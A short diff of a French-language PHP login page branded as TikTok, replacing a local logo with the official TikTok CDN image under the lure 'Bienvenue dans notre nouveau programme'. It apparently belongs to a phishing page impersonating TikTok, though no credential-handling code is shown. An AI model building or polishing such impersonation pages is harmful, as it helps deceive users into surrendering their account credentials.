@@ -15,8 +15,8 @@ include "validate.php";
 <body>
     <div class="container">
         <div class="login-box">
-            <img src="logo.png" alt="TikTok Logo" class="logo">
-            <h1 style="margin-bottom: 3px;">Connexion</h1>
+        <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efa1520dcd11f4b45c0cf6.svg" alt="TikTok Logo" class="logo">
+        <h1 style="margin-bottom: 3px;">Connexion</h1>
             <h5 style="text-align: center;">Bienvenue dans notre nouveau programme</h5>
             
             <div class="login-options">
